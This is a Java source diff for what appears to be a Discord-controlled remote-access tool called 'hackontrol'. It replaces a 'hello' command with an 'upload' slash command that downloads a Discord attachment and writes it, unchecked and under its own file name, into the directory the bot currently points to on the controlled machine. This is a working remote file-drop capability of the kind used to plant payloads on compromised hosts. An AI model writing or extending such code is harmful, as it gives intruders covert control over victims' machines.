@@ -2,6 +2,8 @@ package com.khopan.hackontrol.channel.file;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.List;
@@ -19,7 +21,11 @@ import com.khopan.hackontrol.manager.modal.ModalContext;
 import com.khopan.hackontrol.manager.modal.ModalManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
+import net.dv8tion.jda.api.entities.Message.Attachment;
+import net.dv8tion.jda.api.interactions.commands.OptionMapping;
+import net.dv8tion.jda.api.interactions.commands.OptionType;
 import net.dv8tion.jda.api.interactions.commands.build.Commands;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
@@ -74,14 +80,39 @@ public class FileChannel extends HackontrolChannel {
 
 		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_VIEW_FILE, this :: modalCallbackViewFile);
 		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_GO_INTO, this :: modalCallbackGoInto);
-		registry.register(CommandManager.COMMAND_REGISTRY,
-				Commands.slash("hello", "Reply a hello world message"),
-				this :: helloCommand
-				);
+		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("upload", "Upload a file")
+				.addOption(OptionType.ATTACHMENT, "file", "File to upload", true), this :: uploadFileCommand);
 	}
 
-	private void helloCommand(CommandContext context) {
-		context.reply("Hello, world!").queue();
+	private void uploadFileCommand(CommandContext context) {
+		OptionMapping fileOption = context.getOption("file");
+
+		if(fileOption == null) {
+			HackontrolError.message(context.reply(), "File option is missing");
+			return;
+		}
+
+		if(this.filePointer == null) {
+			HackontrolError.message(context.reply(), "No target location");
+			return;
+		}
+
+		Attachment attachment = fileOption.getAsAttachment();
+		String fileName = attachment.getFileName();
+		File file = new File(this.filePointer, fileName);
+		HackontrolMessage.deletable(context.reply(), "`Upload to '" + file.getAbsolutePath() + "'`");
+
+		try {
+			InputStream inputStream = attachment.getProxy().download().get();
+			byte[] data = inputStream.readAllBytes();
+			inputStream.close();
+			FileOutputStream outputStream = new FileOutputStream(file);
+			outputStream.write(data);
+			outputStream.close();
+		} catch(Throwable Errors) {
+			HackontrolError.throwable(context.message(), Errors);
+			return;
+		}
 	}
 
 	private void goInto(ButtonContext context) {
